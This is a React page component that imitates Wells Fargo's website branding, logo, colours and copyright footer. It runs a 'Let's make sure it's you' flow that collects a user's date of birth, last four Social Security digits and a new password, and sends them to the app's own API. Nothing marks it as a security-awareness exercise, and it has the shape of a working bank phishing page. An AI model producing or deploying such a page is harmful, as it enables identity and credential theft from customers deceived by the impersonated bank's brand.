import { useState, useEffect } from "react";
import { useQuery, useMutation } from "@tanstack/react-query";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent } from "@/components/ui/card";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { Search, Shield, Mail, Phone, HelpCircle, ChevronRight, Loader2, Lock, Check, AlertCircle } from "lucide-react";
import { Link, useLocation } from "wouter";

const verificationMethods = [
  {
    id: "text",
    icon: Phone,
    title: "Text message",
    description: "Get a one-time code sent to your phone",
  },
  {
    id: "call",
    icon: Phone,
    title: "Phone call",
    description: "Get a one-time code by phone call",
  },
  {
    id: "email",
    icon: Mail,
    title: "Email",
    description: "Get a one-time code sent to your email",
  },
];

const identitySchema = z.object({
  dateOfBirth: z.string().min(1, "Date of birth is required"),
  ssn: z.string().length(4, "Please enter exactly 4 digits"),
});

const passwordSchema = z.object({
  newPassword: z.string().min(6, "Password must be at least 6 characters"),
  confirmPassword: z.string().min(6, "Password must be at least 6 characters"),
}).refine((data) => data.newPassword === data.confirmPassword, {
  message: "Passwords don't match",
  path: ["confirmPassword"],
});

type IdentityFormData = z.infer<typeof identitySchema>;
type PasswordFormData = z.infer<typeof passwordSchema>;

export default function VerifyPage() {
  const [step, setStep] = useState<"choose" | "identity" | "password" | "success">("choose");
  const [selectedMethod, setSelectedMethod] = useState<string | null>(null);
  const [, setLocation] = useLocation();
  const { toast } = useToast();

  const { data: authData, isLoading, error } = useQuery({
    queryKey: ["/api/auth/me"],
  });

  useEffect(() => {
    if (error) {
      setLocation("/");
    }
  }, [error, setLocation]);

  const user = (authData as any)?.user;

  const identityForm = useForm<IdentityFormData>({
    resolver: zodResolver(identitySchema),
    defaultValues: {
      dateOfBirth: "",
      ssn: "",
    },
  });

  const passwordForm = useForm<PasswordFormData>({
    resolver: zodResolver(passwordSchema),
    defaultValues: {
      newPassword: "",
      confirmPassword: "",
    },
  });

  const verifyMutation = useMutation({
    mutationFn: async (data: { dateOfBirth: string; ssn: string }) => {
      const response = await apiRequest("POST", "/api/auth/verify-identity", {
        verificationType: "ssn",
        value: data.ssn,
      });
      return response;
    },
    onSuccess: () => {
      toast({
        title: "Identity Verified",
        description: "You can now reset your password.",
      });
      setStep("password");
    },
    onError: (error: Error) => {
      toast({
        title: "Verification Failed",
        description: error.message || "The information provided does not match our records.",
        variant: "destructive",
      });
    },
  });

  const resetPasswordMutation = useMutation({
    mutationFn: async (data: { newPassword: string; confirmPassword: string }) => {
      const response = await apiRequest("POST", "/api/auth/reset-password", data);
      return response;
    },
    onSuccess: () => {
      toast({
        title: "Password Updated",
        description: "Your password has been successfully changed.",
      });
      setStep("success");
    },
    onError: (error: Error) => {
      toast({
        title: "Password Reset Failed",
        description: error.message || "Failed to update password.",
        variant: "destructive",
      });
    },
  });

  const skipVerification = () => {
    setLocation("/dashboard");
  };

  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <Loader2 className="w-8 h-8 animate-spin text-[#d71e28]" />
      </div>
    );
  }

  if (error || !authData) {
    return null;
  }

  const handleMethodSelect = (methodId: string) => {
    setSelectedMethod(methodId);
    setStep("identity");
  };

  const handleIdentityVerify = (data: IdentityFormData) => {
    verifyMutation.mutate(data);
  };

  const handlePasswordReset = (data: PasswordFormData) => {
    resetPasswordMutation.mutate(data);
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#f5f5f5]">
      <header className="bg-[#d71e28] text-white">
        <div className="max-w-7xl mx-auto px-4 py-3">
          <div className="flex items-center justify-between">
            <Link href="/">
              <span
                className="text-xl font-bold tracking-wide cursor-pointer"
                style={{ fontFamily: "'Times New Roman', 'Georgia', serif" }}
                data-testid="text-logo"
              >
                WELLS FARGO
              </span>
            </Link>

            <nav className="flex items-center gap-4 text-xs">
              <a href="#" className="hover:underline hidden sm:inline" data-testid="link-customer-service">
                Customer Service
              </a>
              <a href="#" className="hover:underline hidden sm:inline" data-testid="link-espanol">
                Español
              </a>
              <div className="flex items-center gap-2">
                <Search className="w-4 h-4" />
              </div>
            </nav>
          </div>
        </div>
      </header>

      <div className="bg-[#ffcd41] h-1"></div>

      <main className="flex-1 py-8">
        <div className="max-w-2xl mx-auto px-4">
          {step === "choose" && (
            <>
              <div className="mb-6">
                <h1 className="text-2xl font-light text-gray-800 mb-2" data-testid="text-title">
                  Let's make sure it's you
                </h1>
                <p className="text-gray-600">
                  For your security, we need to verify your identity. How would you like to receive your verification code?
                </p>
              </div>

              <Card className="shadow-sm border-gray-200" data-testid="card-verify">
                <CardContent className="p-0">
                  {verificationMethods.map((method, index) => (
                    <button
                      key={method.id}
                      onClick={() => handleMethodSelect(method.id)}
                      className={`w-full p-4 text-left hover:bg-gray-50 transition-colors flex items-center gap-4 ${
                        index !== verificationMethods.length - 1 ? "border-b border-gray-200" : ""
                      }`}
                      data-testid={`button-method-${method.id}`}
                    >
                      <div className="w-10 h-10 bg-[#d71e28]/10 rounded-full flex items-center justify-center text-[#d71e28]">
                        <method.icon className="w-5 h-5" />
                      </div>
                      <div className="flex-1">
                        <p className="font-medium text-gray-800">{method.title}</p>
                        <p className="text-sm text-gray-500">{method.description}</p>
                      </div>
                      <ChevronRight className="w-5 h-5 text-gray-400" />
                    </button>
                  ))}
                </CardContent>
              </Card>

              <div className="mt-6 flex items-center gap-2 text-sm">
                <HelpCircle className="w-4 h-4 text-gray-500" />
                <span className="text-gray-600">
                  Having trouble?{" "}
                  <a href="#" className="text-[#d71e28] hover:underline">
                    Try another way
                  </a>
                </span>
              </div>

              <div className="mt-8 pt-6 border-t border-gray-200">
                <Button
                  onClick={skipVerification}
                  variant="ghost"
                  className="text-[#d71e28] hover:text-[#b91c23]"
                  data-testid="button-skip"
                >
                  Skip for now
                </Button>
              </div>
            </>
          )}

          {step === "identity" && (
            <>
              <button
                onClick={() => setStep("choose")}
                className="flex items-center gap-1 text-[#d71e28] text-sm mb-6 hover:underline"
                data-testid="button-back"
              >
                <ChevronRight className="w-4 h-4 rotate-180" />
                Back
              </button>

              <div className="mb-6">
                <h1 className="text-2xl font-light text-gray-800 mb-2" data-testid="text-identity-title">
                  Verify your identity
                </h1>
                <p className="text-gray-600">
                  For your security, please confirm your identity by entering the information below.
                </p>
              </div>

              <Card className="shadow-sm border-gray-200" data-testid="card-identity">
                <CardContent className="p-6">
                  <div className="flex items-start gap-3 p-4 bg-blue-50 rounded-lg mb-6">
                    <AlertCircle className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" />
                    <p className="text-sm text-blue-800">
                      Please enter your date of birth and the last 4 digits of your Social Security Number to verify your identity.
                    </p>
                  </div>

                  <Form {...identityForm}>
                    <form onSubmit={identityForm.handleSubmit(handleIdentityVerify)} className="space-y-5">
                      <FormField
                        control={identityForm.control}
                        name="dateOfBirth"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="text-gray-700 font-medium">
                              Date of Birth
                            </FormLabel>
                            <FormControl>
                              <Input
                                type="date"
                                className="h-12 border-gray-300"
                                data-testid="input-dob"
                                {...field}
                              />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />

                      <FormField
                        control={identityForm.control}
                        name="ssn"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="text-gray-700 font-medium">
                              Last 4 digits of SSN
                            </FormLabel>
                            <FormControl>
                              <Input
                                type="password"
                                placeholder="••••"
                                maxLength={4}
                                className="h-12 border-gray-300"
                                data-testid="input-ssn"
                                {...field}
                              />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />

                      <Button
                        type="submit"
                        className="w-full h-12 bg-[#d71e28] hover:bg-[#b91c23] text-white font-semibold rounded"
                        disabled={verifyMutation.isPending}
                        data-testid="button-verify-submit"
                      >
                        {verifyMutation.isPending ? (
                          <>
                            <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                            Verifying...
                          </>
                        ) : (
                          "Continue"
                        )}
                      </Button>
                    </form>
                  </Form>
                </CardContent>
              </Card>

              <p className="text-xs text-gray-500 mt-4 text-center">
                Your information is protected with bank-level encryption.
              </p>
            </>
          )}

          {step === "password" && (
            <>
              <div className="mb-6">
                <div className="flex items-center gap-2 text-green-600 mb-4">
                  <div className="w-6 h-6 bg-green-100 rounded-full flex items-center justify-center">
                    <Check className="w-4 h-4" />
                  </div>
                  <span className="text-sm font-medium">Identity verified</span>
                </div>
                <h1 className="text-2xl font-light text-gray-800 mb-2" data-testid="text-password-title">
                  Change your password
                </h1>
                <p className="text-gray-600">
                  Create a new password for your account. Your password must be at least 6 characters.
                </p>
              </div>

              <Card className="shadow-sm border-gray-200" data-testid="card-password">
                <CardContent className="p-6">
                  <Form {...passwordForm}>
                    <form onSubmit={passwordForm.handleSubmit(handlePasswordReset)} className="space-y-5">
                      <FormField
                        control={passwordForm.control}
                        name="newPassword"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="text-gray-700 font-medium">
                              New Password
                            </FormLabel>
                            <FormControl>
                              <Input
                                type="password"
                                placeholder="Enter new password"
                                className="h-12 border-gray-300"
                                data-testid="input-new-password"
                                {...field}
                              />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />

                      <FormField
                        control={passwordForm.control}
                        name="confirmPassword"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="text-gray-700 font-medium">
                              Confirm New Password
                            </FormLabel>
                            <FormControl>
                              <Input
                                type="password"
                                placeholder="Re-enter new password"
                                className="h-12 border-gray-300"
                                data-testid="input-confirm-password"
                                {...field}
                              />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />

                      <div className="bg-gray-50 p-4 rounded-lg">
                        <p className="text-sm font-medium text-gray-700 mb-2">Password requirements:</p>
                        <ul className="text-sm text-gray-600 space-y-1">
                          <li className="flex items-center gap-2">
                            <div className="w-1.5 h-1.5 bg-gray-400 rounded-full"></div>
                            At least 6 characters
                          </li>
                          <li className="flex items-center gap-2">
                            <div className="w-1.5 h-1.5 bg-gray-400 rounded-full"></div>
                            Include letters and numbers
                          </li>
                          <li className="flex items-center gap-2">
                            <div className="w-1.5 h-1.5 bg-gray-400 rounded-full"></div>
                            Cannot be your previous password
                          </li>
                        </ul>
                      </div>

                      <Button
                        type="submit"
                        className="w-full h-12 bg-[#d71e28] hover:bg-[#b91c23] text-white font-semibold rounded"
                        disabled={resetPasswordMutation.isPending}
                        data-testid="button-reset-password"
                      >
                        {resetPasswordMutation.isPending ? (
                          <>
                            <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                            Updating...
                          </>
                        ) : (
                          "Change Password"
                        )}
                      </Button>
                    </form>
                  </Form>
                </CardContent>
              </Card>
            </>
          )}

          {step === "success" && (
            <div className="text-center py-8">
              <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
                <Check className="w-8 h-8 text-green-600" />
              </div>
              <h1 className="text-2xl font-light text-gray-800 mb-2" data-testid="text-success-title">
                Password changed successfully
              </h1>
              <p className="text-gray-600 mb-8">
                Your password has been updated. You can now access your accounts with your new password.
              </p>
              <Button
                onClick={() => setLocation("/dashboard")}
                className="h-12 bg-[#d71e28] hover:bg-[#b91c23] text-white font-semibold rounded px-8"
                data-testid="button-continue-dashboard"
              >
                Go to My Accounts
              </Button>
            </div>
          )}
        </div>
      </main>

      <footer className="bg-white border-t border-gray-200 py-6">
        <div className="max-w-7xl mx-auto px-4">
          <div className="flex flex-wrap items-center justify-between gap-4 text-xs text-gray-500">
            <div className="flex items-center gap-4">
              <a href="#" className="hover:underline">Privacy, Cookies, Security & Legal</a>
              <a href="#" className="hover:underline">Notice of Data Collection</a>
              <a href="#" className="hover:underline">Ad Choices</a>
            </div>
            <p data-testid="text-copyright">
              © 1999 - 2026 Wells Fargo. All rights reserved. NMLSR ID 399801
            </p>
          </div>
        </div>
      </footer>
    </div>
  );
}
